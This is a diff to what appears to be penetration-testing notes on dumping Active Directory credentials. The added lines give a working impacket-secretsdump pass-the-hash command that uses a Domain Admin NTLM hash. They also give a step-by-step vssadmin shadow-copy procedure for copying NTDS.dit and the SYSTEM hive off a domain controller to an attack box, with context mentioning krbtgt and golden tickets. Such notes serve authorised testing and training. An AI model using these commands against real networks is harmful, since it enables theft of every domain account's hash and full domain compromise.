@@ -39,7 +39,30 @@ krbtgt:502:...
 
 - this dumps every single domain account's NT hash in one shot, `krbtgt` account is especially valuable later (golden ticket attacks, covered elsewhere)
 
+- Or if you only got the Domain Admin Hash, you can try this:
+```bash
+# Same result but use hashes instead
+# the hash is just empty hash a blank or disabled LM password in Windows hash dumps
+impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM Hashes> <user>@<ip address> -just-dc
+```
+
 - Manual way (if netexec's module isn't available): `vssadmin` to shadow-copy C:, copy NTDS.dit + SYSTEM off it, transfer to attack box, then `secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL`
+
+```cmd
+vssadmin create shadow /for=C:
+
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
+
+cd C:\temp
+
+download ntds.dit
+
+reg.exe save hklm\system C:\system.save
+
+cd C:\
+
+download system.save
+```
 
 ---
 ## Step 5: Crack or Pass-the-Hash
